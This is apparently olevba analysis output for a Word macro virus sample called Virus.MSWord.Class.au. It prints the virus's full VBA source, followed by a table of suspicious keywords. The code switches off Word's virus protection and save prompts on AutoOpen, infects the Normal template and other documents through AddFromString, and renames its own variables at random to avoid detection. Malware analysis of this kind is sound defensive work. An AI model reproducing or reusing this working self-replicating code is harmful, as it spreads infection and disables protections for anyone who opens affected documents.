olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.au-89321f9485f6d4108ef3e3ce8b56ac155959db1f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.au-89321f9485f6d4108ef3e3ce8b56ac155959db1f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
PE8690 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
GL8530 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set RQ4058 = ActiveDocument.VBProject.VBComponents.Item(1)
EM333 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set RQ4058 = NormalTemplate.VBProject.VBComponents.Item(1)
DV094 = True
Call QE896_JI08
End If
If DV094 <> True And EM333 <> True Then GoTo SA2266
If DV094 = True Then RQ4058.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PE8690 - 1))
If EM333 = True Then RQ4058.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GL8530 - 1))
SA2266:
If GL8530 <> 0 And PE8690 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub QE896_JI08()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "EN642": r1(2) = "FK2681": r1(3) = "FP2810": r1(4) = "LM8433": r1(5) = "JI08": r1(6) = "PE8690"
r1(7) = "GL8530": r1(8) = "EM333":: r1(9) = "RQ4058": r1(10) = "DV094": r1(11) = "SA2266": r1(12) = "QE896": r1(13) = "LD4177": r1(14) = "SD8150"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call JI08(a1, r1(x))
Next x
End Sub
Private Sub JI08(SD8150, LD4177 As String)  'v1.0
On Error Resume Next
Dim EN642 As Long: Dim FK2681 As Long: Dim FP2810 As Long: Dim LM8433 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
EN642 = 1: FK2681 = 1: FP2810 = .CountOfLines: LM8433 = Len(.Lines(.CountOfLines, 1))
Do While .Find(LD4177, EN642, FK2681, FP2810, LM8433, True)
strline = .Lines(EN642, 1)
strline = Left(strline, FK2681 - 1) & SD8150 & Mid(strline, LM8433)
.replaceline EN642, strline
EN642 = FP2810 + 1: FK2681 = 1:
FP2810 = .CountOfLines
LM8433 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
